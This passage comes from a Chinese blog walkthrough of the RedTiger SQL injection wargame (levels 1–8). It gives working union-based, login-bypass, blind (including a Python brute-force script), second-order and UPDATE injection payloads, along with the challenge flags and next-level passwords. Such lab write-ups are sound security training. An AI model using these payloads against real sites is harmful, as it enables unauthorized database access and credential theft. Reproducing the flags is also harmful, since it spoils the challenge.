<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试多少列：?cat=1 order by 4</span><br><span class="line">2. 测试显示位：?cat=-1 union select 1,2,3,4</span><br><span class="line">3. 测得数据库为hackit：?cat=-1 union select 1,2,3,database()</span><br></pre></td></tr></table></figure>
<p>如果按照常规的显示表、列会出现 <code>Some things are disabled!!!</code> 也就是被过滤了。但是考虑到表名给我们了，并且根据描述，可以猜测表内有<code>username, password</code> 两个字段。因此构造如下paylaod： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cat=-1 union select 1,2,username,password from level1_users</span><br></pre></td></tr></table></figure></p>
<p>得到用户名为：Hornoxe，密码为：thatwaseasy。成功登录： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 27cbddc803ecde822d87a7e8639f9315  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: passwords_will_change_over_time_let_us_do_a_shitty_rhyme</span><br></pre></td></tr></table></figure></p>
<p>可以到wechall上提交flag，网址：https://www.wechall.net/14-levels-on-Hackit.html</p>
<h1 id="level-2">Level-2</h1>
<h2 id="题目描述-1">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318153929.png" /></p>
<p>根据描述，这道题是登录绕过。</p>
<h2 id="测试注入点-1">测试注入点</h2>
<p>分别对username和password测试，结果如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;&amp;password=123&amp;login=Login</span><br></pre></td></tr></table></figure> 对应：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154813.png" /></p>
<p>而 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>对应： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154617.png" /></p>
<p>因此注入点应该在password。</p>
<p>并且 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27;#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>则不出现报错信息，只出现 <code>login incorrect!</code>。这就更加确定password为注入点。</p>
<h2 id="注入过程-1">注入过程</h2>
<p>本题为登录绕过，因此尝试万能密码： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&amp;password=123&#x27; or 1=1#&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现成功登录： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154759.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 1222e2d4ad5da677efb188550528bfaa  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: feed_the_cat_who_eats_your_bread</span><br></pre></td></tr></table></figure>
<h1 id="level-3">Level-3</h1>
<h2 id="题目描述-2">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318154944.png" /></p>
<p>本题很有难度，注意提示 <code>try to get an error</code>。点击 <code>TheCow</code> 和 <code>Admin</code> url会出现 <code>usr</code> 参数，但是不乱是 <code>1=1</code> 还是 <code>1=2</code> 或者加单引号都不起作用，并且将原来的usr经过base64解码后得到的也只是一串数字，跟TheCow和Admin无法对上。查看大佬的writeup之后发现，需要<strong>传入数组让它报错</strong>！</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318155401.png" /></p>
<p>注意 <code>/var/www/html/hackit/urlcrypt.inc</code> ，这是一个文件，输入网址：<code>http://redtiger.labs.overthewire.org/urlcrypt.inc</code> 并且查看源码得到如下代码： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="comment">// warning! ugly code ahead :)</span></span><br><span class="line">	<span class="comment">// requires php5.x, sorry for that</span></span><br><span class="line">  		</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="variable">$cryptedstr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">for</span> (<span class="variable">$i</span> =<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>++)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$temp</span> = ord(substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">1</span>)) ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">			</span><br><span class="line">			<span class="keyword">while</span>(strlen(<span class="variable">$temp</span>)&lt;<span class="number">3</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$temp</span> = <span class="string">&quot;0&quot;</span>.<span class="variable">$temp</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$cryptedstr</span> .= <span class="variable">$temp</span>. <span class="string">&quot;&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> base64_encode(<span class="variable">$cryptedstr</span>);</span><br><span class="line">	&#125;</span><br><span class="line">  </span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">decrypt</span> (<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		srand(<span class="number">3284724</span>);</span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;%^[a-zA-Z0-9/+]*=&#123;0,2&#125;$%&#x27;</span>,<span class="variable">$str</span>))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="variable">$str</span> = base64_decode(<span class="variable">$str</span>);</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$str</span> != <span class="string">&quot;&quot;</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">null</span> &amp;&amp; <span class="variable">$str</span> != <span class="literal">false</span>)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="variable">$decStr</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; strlen(<span class="variable">$str</span>); <span class="variable">$i</span>+=<span class="number">3</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$array</span>[<span class="variable">$i</span>/<span class="number">3</span>] = substr(<span class="variable">$str</span>,<span class="variable">$i</span>,<span class="number">3</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">foreach</span>(<span class="variable">$array</span> <span class="keyword">as</span> <span class="variable">$s</span>)</span><br><span class="line">				&#123;</span><br><span class="line">					<span class="variable">$a</span> = <span class="variable">$s</span> ^ rand(<span class="number">0</span>, <span class="number">255</span>);</span><br><span class="line">					<span class="variable">$decStr</span> .= chr(<span class="variable">$a</span>);</span><br><span class="line">				&#125;</span><br><span class="line">				</span><br><span class="line">				<span class="keyword">return</span> <span class="variable">$decStr</span>;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">	&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
<p>注意前面的提示，代码只能运行在PHP5.x 版本，太高或者太低的版本会导致最终的加密结果不对！！！</p>
<h2 id="测试注入点-2">测试注入点</h2>
<p>推荐网址，可以选择php版本：http://www.dooccn.com/php5.5/</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160027.png" /></p>
<p>将点击Admin之后得到的usr的值代入解密发现结果正好是Admin，因此得出结论，usr就是注入点，并且需要将payload经过加密后再传入。将 <code>Admin'</code> 加密后传入，发现报错，而 <code>Admin'#</code> 加密后传入正常显示。因此闭合方式为单引号。</p>
<h2 id="注入过程-2">注入过程</h2>
<p>首先，表名已经给了，为：<code>level3_users</code>，需要获得Admin的密码，猜测字段名为：<code>password</code>。（这个网站的字段名都比较正常）因此构造payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?usr=Admin&#x27; order by 7#  </span><br><span class="line">加密后：MDQyMjExMDE0MTgyMTQwMTc0MjIzMDg3MjA4MTAxMTg0MTQyMDA5MTczMDA2MDY5MjMyMDY2</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?usr=&#x27; union select 1,2,3,4,5,6,7# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMjAzMTY2</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318160839.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">得到密码：?usr=&#x27; union select 1,2,3,4,5,6,password from level3_users wehre username=&#x27;admin&#x27;# </span><br><span class="line">加密后：MDc2MTUxMDIyMTc3MTM5MjMwMTQ1MDI0MjA5MTAwMTc3MTUzMDc0MTg3MDk1MDg0MjQzMDgzMTc3MDg5MDMzMjIzMjQzMTk0MDcyMjM2MTMwMTQwMjI4MDYzMTk4MTM1MTA3MTA2MTgwMTk4MTk2MTg5MTEzMDQxMjQwMTQ0MDM2MTQwMTY5MTcyMDgzMjQ0MDg3MTQxMTE1MDY2MTUzMjE0MDk1MDM4MTgxMTY1MDQ3MTE4MDg2MTQwMDM0MDg1MTE4MTE4MDk5MjIyMjE4MDEwMTU4MjIwMDcxMDQwMjIwMjA5MDMz</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161210.png" /></p>
<p>注意登录的时候，Username为admin，不要大写。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: a707b245a60d570d25a0449c2a516eca</span><br><span class="line"></span><br><span class="line">The password for the next level is: put_the_kitten_on_your_head</span><br></pre></td></tr></table></figure>
<h1 id="level-4">Level-4</h1>
<h2 id="题目描述-3">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318161335.png" /></p>
<p>发现给出了表名为：level4_secret， 字段名为：keyword，并且过滤了 like。</p>
<p>点击 <code>Click me</code>，url出现id=1。</p>
<h2 id="测试注入点-3">测试注入点</h2>
<p>分别用 <code>?id=1=1</code> 和 <code>?id=1=2</code> 测试，分别对应如下的结果：</p>
<ul>
<li>前者提示为：<code>Query returned 1 rows.</code></li>
<li>后者提示为：<code>Query returned 0 rows.</code></li>
</ul>
<p>因此为数字型的注入点。</p>
<h2 id="注入过程-3">注入过程</h2>
<p>注意本题是盲注。并且如果判断错误将会出现提示<code>Query returned 0 rows.</code>，而判断正确则会出现<code>Query returned 1 rows.</code>或者<code>Query returned 2 rows.</code>。因此根据错误的提示不同可以先测试以下word的长度为多少。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?id=1 and length((select keyword from level4_secret limit 0,1))=21</span><br></pre></td></tr></table></figure></p>
<p>不断修改后面的值，发现长度为21，因此编写如下脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, time  </span><br><span class="line">  </span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>  </span><br><span class="line">url = <span class="string">&#x27;http://redtiger.labs.overthewire.org/level4.php&#x27;</span>  </span><br><span class="line">header = &#123;  </span><br><span class="line">    <span class="string">&#x27;cookie&#x27;</span>: <span class="string">&#x27;level2login=passwords_will_change_over_time_let_us_do_a_shitty_rhyme; level3login=feed_the_cat_who_eats_your_bread; level4login=put_the_kitten_on_your_head&#x27;</span>  </span><br><span class="line">&#125;  </span><br><span class="line">payload = <span class="string">&#x27;1 and ascii(substr((select keyword from level4_secret limit 0,1),%d,1))=%d&#x27;</span>  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">22</span>):  </span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>, <span class="number">127</span>):  </span><br><span class="line">        param = &#123;  </span><br><span class="line">            <span class="string">&quot;id&quot;</span>: payload % (i, j)  </span><br><span class="line">        &#125;  </span><br><span class="line">        r = requests.get(url, params=param, headers=header)  </span><br><span class="line">        time.sleep(<span class="number">0.2</span>)  </span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Query returned 0 rows&quot;</span> <span class="keyword">in</span> r.text:  </span><br><span class="line">            <span class="keyword">continue</span>  </span><br><span class="line"> flag += <span class="built_in">chr</span>(j)  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)  </span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure> （本题需要注意，每次通过都会给一个<code>The password for the next level is:xxx</code> 这是用来登录的，会保存在cookie中，所以要在脚本中添加cookie，否则无法访问。可以抓包查看cookie）</p>
<p>得到： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">killstickswithbr1cks!</span><br></pre></td></tr></table></figure></p>
<p>成功注入。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: e8bcb79c389f5e295bac81fda9fd7cfa</span><br><span class="line"></span><br><span class="line">The password for the next level is: this_hack_it&#x27;s_old</span><br></pre></td></tr></table></figure></p>
<h1 id="level-5">Level-5</h1>
<h2 id="题目描述-4">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318165905.png" /></p>
<p>本题也是登录绕过，并且存在过滤，而且密码是经过md5加密的。</p>
<h2 id="测试注入点-4">测试注入点</h2>
<p>分别使用： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. username=1&#x27;&amp;password=1&amp;login=Login</span><br><span class="line">2. username=1&#x27;#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql_num_rows() expects parameter 1 to be resource, boolean given in &lt;b&gt;/var/www/html/hackit/level5.php</span><br></pre></td></tr></table></figure></p>
<p>而后者没有，说明 username为注入点，并且闭合方式为单引号。</p>
<h2 id="注入过程-4">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：username=1&#x27; order by 2#&amp;password=1&amp;login=Login</span><br></pre></td></tr></table></figure>
<p>本题是登录绕过，所以优先尝试 <code>1' or 1=1#</code> 发现无法登录。又因为字段数为2，因此做一个猜测（这很重要，很多情况都需要猜测）：</p>
<blockquote>
<p>这两个字段一个是username，另一个是password。根据输入的username，去数据库查询是否存在该用户，如果存在该用户则返回username和password，然后将返回的password和输入的password进行对比，如果一样则登录成功，否则登陆失败。</p>
</blockquote>
<p>根据这猜测，那么我们随便查询一个不存在的用户，这样子就没有返回的结果。然后联合查询，密码字段为<code>md5(number)</code>，这样子就会返回一个结果，其中密码字段为 <code>md5(number)</code> 。如果输入的password为 <code>number</code> ，则md5加密后会与返回结果中的密码一致，从而登陆成功。所以构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=1&#x27; union select 1,md5(1)#&amp;password=1&amp;login=Login</span><br><span class="line"></span><br><span class="line">或者：</span><br><span class="line">username: 1&#x27; union select 1,md5(1)#</span><br><span class="line">password: 1</span><br></pre></td></tr></table></figure></p>
<p>需要注意两点： 1. 上面所述的 number 要一样； 2. 要得到password所在的位置，要么第一个，要么第二个，尝试两次就出来了；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: the_stone_is_cold</span><br></pre></td></tr></table></figure>
<h1 id="level-6">Level-6 ⭐</h1>
<h2 id="题目描述-5">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318171918.png" /></p>
<p>点击 <code>Click me</code> 发现url出现变化，多了一个 <code>user</code> 参数。</p>
<h2 id="测试注入点-5">测试注入点</h2>
<p>分别使用 <code>?user=1=1</code> 和 <code>?user=1=2</code> 进行测试，发现前者出现报错，而后者没有报错，因此user为数字型注入点。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172316.png" /></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318172325.png" /></p>
<h2 id="注入过程-5">注入过程</h2>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试字段数：?user=1 order by 5</span><br></pre></td></tr></table></figure>
<p>字段数为5。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">测试显示位：?user=-1 union select 1,2,3,4,5</span><br></pre></td></tr></table></figure></p>
<p>得到一个很奇怪的结果：<code>User not found</code>，也就是没有显示位，只是返回了user=-1的查询结果。如下payload的结果也是一样： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,2,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p>接下来就是随便的一些尝试，分别将 <code>admin</code>, <code>deddlef</code>, <code>username</code>,<code>password</code> 四个关键词分别带入五个位置，基本都是提示： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318191919.png" /></p>
<p>只有下面的payload有所不同： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1 union select 1,username,3,4,5 from level6_users where status=1</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318192043.png" /></p>
<h3 id="思路">思路 ⭐</h3>
<p>出现了新的显示。看了大佬的writeup，得到如下思路：</p>
<p>后台进行了二次查询，首先检查 user 参数，如果查询的 user 存在的话，则会返回结果，这个结果有5列，即5个字段。然后再将结果中的第二个字段进行查询，此时得到的结果才会最终显示出来，即上图中的 username和email。因此，真正的注入点是第二个字段。 解释： <code>user=-1 union select 1,2,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">2</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>而<code>user=-1 union select 1,username,3,4,5</code> 返回的结果如下：</p>
<table>
<thead>
<tr class="header">
<th style="text-align: center;">字段1</th>
<th style="text-align: center;">字段2</th>
<th style="text-align: center;">字段3</th>
<th style="text-align: center;">字段4</th>
<th style="text-align: center;">字段5</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td style="text-align: center;">1</td>
<td style="text-align: center;">username</td>
<td style="text-align: center;">3</td>
<td style="text-align: center;">4</td>
<td style="text-align: center;">5</td>
</tr>
</tbody>
</table>
<p>此时字段2即为注入点，如果直接输入 admin，则会返回admin的信息。</p>
<h3 id="过程">过程</h3>
<p>所以对第二个字段进行注入，根据得到的结果，第二个字段应该是username，然后利用username进行第二次查询数据库，得到信息。</p>
<p>这里有一个细节看：[[SQL注入总结#利用]] <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?user=-1%20union%20select%201,admin&#x27;,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e27,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line"></span><br><span class="line">?user=-1%20union%20select%201,admin&#x27;#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后：?user=-1%20union%20select%201,0x61646d696e2723,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure></p>
<p>发现前者出现报错，而后者没有报错。说明确实在第二个字段处存在注入，接下来就是常规的注入过程。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 测试字段数：</span><br><span class="line">?user=-1%20union%20select%201,admin&#x27; order by 5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x61646d696e27206f72646572206279203523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>发现显示字段还是5个</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2. 测试显示位：</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,2,3,4,5#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c322c332c342c3523,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>结果如下： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194025.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3. 显示用户名和密码</span><br><span class="line">?user=-1%20union%20select%201,&#x27; union select 1,username,3,password,5 from level6_users where status=1#,3,4,5%20from%20level6_users%20where%20status=1</span><br><span class="line">16进制转换后:?user=-1%20union%20select%201,0x2720756e696f6e2073656c65637420312c757365726e616d652c332c70617373776f72642c352066726f6d206c6576656c365f7573657273207768657265207374617475733d3123,3,4,5%20from%20level6_users%20where%20status=1</span><br></pre></td></tr></table></figure>
<p>成功得到用户名和密码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318194406.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 074113b268d87dea21cc839954dec932</span><br><span class="line"></span><br><span class="line">The password for the next level is: shitcoins_are_hold</span><br></pre></td></tr></table></figure>
<h1 id="level-7">Level-7</h1>
<h2 id="题目描述-6">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195333.png" /></p>
<p>题目要求：查询关于google的信息的作者，输入google发现得到一篇文章，但是没有作者。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318195818.png" /></p>
<h2 id="测试注入点-6">测试注入点</h2>
<p>输入 <code>google'</code> 发现报错信息： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)&#x27; at line 1</span><br><span class="line"></span><br><span class="line">SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%google&#x27;%&#x27; OR text.title LIKE &#x27;%google&#x27;%&#x27;)</span><br><span class="line"></span><br><span class="line">因此，完整的查询语句如下：SELECT news.*,text.text,text.title FROM level7_news news, level7_texts text WHERE text.id = news.id AND (text.text LIKE &#x27;%输入%&#x27; OR text.title LIKE &#x27;%输入%&#x27;)</span><br></pre></td></tr></table></figure></p>
<p>但是 <code>#</code> 、<code>空格</code> 、<code>--+</code> 都被过滤了。但是可以用 <code>%09</code> 和 <code>%a0</code> 代替，不过注意一定要在burpsuite中，不要直接在输入框中输入，否则%号会被再次url编码。其中 <code>%09</code> 为制表符，后者不太懂。</p>
<p>因此： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=google%&#x27;)--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203348.png" /></p>
<h2 id="注入过程-6">注入过程</h2>
<p>获取显示位： 发现 order by被过滤，不论是大小写、注释都不行。那么直接使用联合查询，如果位数不对也会报错 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,4--%a0&amp;dosearch=search%21 -&gt; 四个字段</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203641.png" /></p>
<p>获取作者名字： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">search=-1%&#x27;)union select 1,2,3,autor from level7_news--%a0&amp;dosearch=search%21</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318203840.png" /></p>
<p>猜测应该是 <code>TestUserforg00gle</code>，成功。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 970cecc0355ed85306588a1a01db4d80</span><br><span class="line"></span><br><span class="line">The password for the next level is: or_so_i&#x27;m_told</span><br></pre></td></tr></table></figure>
<h1 id="level-8">Level-8</h1>
<h2 id="题目描述-7">题目描述 ⭐</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318204016.png" /></p>
<p>这道题给出的是关于 admin 的信息，还有编辑的按钮。猜测本题应该是关于数据更新的注入，即 <code>update</code> ，前面都是 <code>select</code> 的。</p>
<p><code>update</code> 的语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=value2,... where column_name3=value;</span><br><span class="line"></span><br><span class="line">前面的column_name是要修改的字段，如果是字符串，则value需要加引号。后面的column_name3是用来找到需要修改的信息。</span><br></pre></td></tr></table></figure></p>
<p>需要注意的是： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update table_name set column_name1=value1,column_name2=column_name4,... where column_name3=value;</span><br></pre></td></tr></table></figure></p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318210614.png" /></p>
<p>上述语句会将字段4的值赋给字段2，本题应该考察的就是这个。</p>
<h2 id="测试注入点-7">测试注入点</h2>
<p>依次对所有的输入添加单引号，发现只有 Email 报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>如果payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
<p>报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>可以看到，被影响的只有 icq 和 age，而 name 没被影响，推测后台语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<h2 id="注入过程-7">注入过程</h2>
<p>上述可知，我们需要将密码的值赋给4个字段中的其中一个，有两种情况： - icq和age其中一个</p>
<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">真正查询语句为：update tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<p>测试发现这种做法不行。报错信息为：<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>。</p>
<ul>
<li>email和name其中一个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据报错信息：12345&#x27;,age = &#x27;90&#x27; WHERE id = 1，需要将 icq=&#x27; 补齐</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
<p>成功得到密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
<h3 id="疑惑点">疑惑点 ⭐</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
<p>报错信息分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
<p>也就是注释符只注释了email=’‘ 中后面的单引号。前者为 <code>(email='')(',icq=')12345'</code>，括号只是为了方便看。而后者为 <code>(email='')#',icq='12345'</code>，按道理后面的都应该被注释掉了，我的猜测如下（本人php代码差，如果有误请多多批评）：</p>
